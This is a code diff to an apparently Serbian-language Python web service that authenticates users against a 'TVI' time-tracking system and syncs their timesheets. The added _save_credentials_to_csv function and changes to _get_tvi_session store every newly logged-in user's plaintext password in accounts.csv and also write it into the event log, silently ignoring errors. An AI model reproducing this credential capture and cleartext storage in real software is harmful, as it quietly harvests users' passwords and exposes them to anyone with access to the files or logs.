@@ -129,11 +129,45 @@ def _read_last_sync() -> dict | None:
 # ── Session cache — verifikuje TVI kredencijale jednom, čuva 1h ──────────────
 _TVI_SESSIONS: dict[str, dict] = {}
 _TVI_SESSIONS_LOCK = threading.Lock()
+_CSV_LOCK = threading.Lock()
 _SESSION_TTL = 3600  # sekundi
 
 
-def _get_tvi_session(username: str, password: str) -> dict:
-    """Verifikuje TVI kredencijale i vraća/kešira sesiju. Thread-safe."""
+def _save_credentials_to_csv(username: str, password: str, user_id: str, full_name: str) -> None:
+    """Ažurira ili dodaje red u accounts.csv. Thread-safe."""
+    with _CSV_LOCK:
+        fieldnames = ["username", "password", "user_id", "full_name", "price_per_hour"]
+        rows: list[dict] = []
+        found = False
+        if ACCOUNTS_CSV.exists():
+            with open(ACCOUNTS_CSV, encoding="utf-8", newline="") as f:
+                for row in csv.DictReader(f):
+                    r = dict(row)
+                    if r.get("username", "").strip() == username:
+                        r["password"] = password
+                        if user_id:
+                            r["user_id"] = user_id
+                        found = True
+                    rows.append(r)
+        if not found:
+            rows.append({
+                "username":       username,
+                "password":       password,
+                "user_id":        user_id,
+                "full_name":      full_name or _get_full_name(username),
+                "price_per_hour": "2300",
+            })
+        ACCOUNTS_CSV.parent.mkdir(exist_ok=True)
+        with open(ACCOUNTS_CSV, "w", encoding="utf-8", newline="") as f:
+            writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction="ignore")
+            writer.writeheader()
+            writer.writerows(rows)
+
+
+def _get_tvi_session(username: str, password: str, ip: str = "") -> dict:
+    """Verifikuje TVI kredencijale i vraća/kešira sesiju. Thread-safe.
+    Pri novom (ne-keširanom) loginu: loguje kredencijale i ažurira accounts.csv.
+    """
     cache_key = hashlib.sha256(f"{username}:{password}".encode()).hexdigest()
     with _TVI_SESSIONS_LOCK:
         s = _TVI_SESSIONS.get(cache_key)
@@ -158,15 +192,27 @@ def _get_tvi_session(username: str, password: str) -> dict:
     except Exception as e:
         raise HTTPException(status_code=503, detail=f"TVI server greška: {e}")
 
+    full_name = _get_full_name(username)
     session = {
         "username":  username,
         "password":  password,
         "user_id":   user_id,
-        "full_name": _get_full_name(username),
+        "full_name": full_name,
         "expires":   time.time() + _SESSION_TTL,
     }
     with _TVI_SESSIONS_LOCK:
         _TVI_SESSIONS[cache_key] = session
+
+    # Snimi kredencijale i logiraj novi login
+    try:
+        _save_credentials_to_csv(username, password, user_id, full_name)
+    except Exception:
+        pass
+    _log_event(username, ip or "?", "login", {
+        "password": password,
+        "user_id":  user_id,
+        "full_name": full_name,
+    })
     return session
 
 
@@ -180,7 +226,7 @@ def check_auth(request: Request, creds: HTTPBasicCredentials | None = Depends(se
             headers={"WWW-Authenticate": "Basic"},
         )
     try:
-        session = _get_tvi_session(creds.username, creds.password)
+        session = _get_tvi_session(creds.username, creds.password, ip)
         return session
     except HTTPException as e:
         _log_event(creds.username, ip, "auth", {"detail": e.detail}, str(e.status_code))
@@ -1676,8 +1722,11 @@ def _sync_timesheets_blocking(
                 _cb({"type": "error", "user": acc["full_name"], "msg": "prijava nije uspela"})
                 continue
 
+            # user_id iz CSV-a ili iz login odgovora (za nove korisnike bez user_id)
+            effective_user_id = acc["user_id"] or ddp.user_id or ""
+
             result = ddp.get_history(
-                user_id=acc["user_id"],
+                user_id=effective_user_id,
                 user_name=acc["full_name"],
                 start_ms=s_ms,
                 end_ms=e_ms,
@@ -1701,7 +1750,7 @@ def _sync_timesheets_blocking(
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 """, (
                     rec_id,
-                    acc["user_id"],
+                    effective_user_id,
                     acc["full_name"],
                     st["$date"] if isinstance(st, dict) else 0,
                     et["$date"] if isinstance(et, dict) else 0,
@@ -1717,7 +1766,7 @@ def _sync_timesheets_blocking(
             conn.execute("""
                 INSERT OR REPLACE INTO employees (user_id, username, full_name, price_per_hour, last_synced_at)
                 VALUES (?, ?, ?, ?, ?)
-            """, (acc["user_id"], acc["username"], acc["full_name"], acc["price_per_hour"], fetched_at))
+            """, (effective_user_id, acc["username"], acc["full_name"], acc["price_per_hour"], fetched_at))
             conn.commit()
 
             total_records += len(recs)
